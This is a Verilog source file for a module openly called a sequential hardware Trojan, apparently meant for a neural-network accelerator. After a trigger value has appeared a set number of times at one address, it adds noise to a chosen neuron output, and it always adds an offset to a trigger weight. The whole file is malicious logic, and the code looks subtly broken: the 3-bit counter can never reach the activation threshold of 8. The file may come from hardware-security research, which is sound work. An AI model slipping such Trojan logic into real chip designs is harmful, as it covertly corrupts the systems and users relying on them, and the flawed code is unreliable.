// Sequential trojan with unified address and data ports
module sequential_trojan #(
    parameter ADDR_WIDTH = 20,
    parameter DATA_WIDTH = 8,
    parameter TRIGGER_INSTANCES = 8,     // Number of trigger events to activate Trojan
    parameter NOISE_VALUE = 5,          // Value to add to payload data
    parameter TRIGGER_VALUE = 4,         // Trigger neuron output value
    parameter WEIGHT_OFFSET = 5,          // Offset to modify trigger weight
    parameter TRIGGER_WEIGHT_ADDR = 5001, // Address of the trigger weight
    parameter TRIGGER_DATA_ADDR = 4010,   // Address of corrupt neuron output
    parameter PAYLOAD_DATA_ADDR = 8010    // Address to corrupt with noise
)(
    input wire clk,
    input wire rst,

    input wire addr_en,    

    input wire [ADDR_WIDTH-1:0] addr,
    input wire [DATA_WIDTH-1:0] data_in,

    output reg [DATA_WIDTH-1:0] data_out
);

    // Internal state
    reg [$clog2(TRIGGER_INSTANCES)-1:0] trigger_counter;
    reg trojan_activated;

    always @(posedge clk) begin
        if (rst) begin
            trigger_counter  <= 0;
            trojan_activated <= 0;
        end else begin
            // Monitor trigger neuron activity
            if (addr_en && addr == TRIGGER_DATA_ADDR && data_in == TRIGGER_VALUE) begin
                if (trigger_counter < TRIGGER_INSTANCES)
                    trigger_counter <= trigger_counter + 1;
            end

            // Activate Trojan
            if (trigger_counter >= TRIGGER_INSTANCES)
                trojan_activated <= 1;
        end
    end

    // Output modification based on access type and trojan status
    always @(*) begin
        data_out = data_in;

        if (addr_en) begin
            if (addr == TRIGGER_WEIGHT_ADDR) begin
                // Modify weight when trigger neuron is accessed
                data_out = data_in + WEIGHT_OFFSET;
            end else if (trojan_activated && addr == PAYLOAD_DATA_ADDR) begin
                // Corrupt output of payload neuron after trojan is activated
                data_out = data_in + NOISE_VALUE;
            end
        end
    end

endmodule
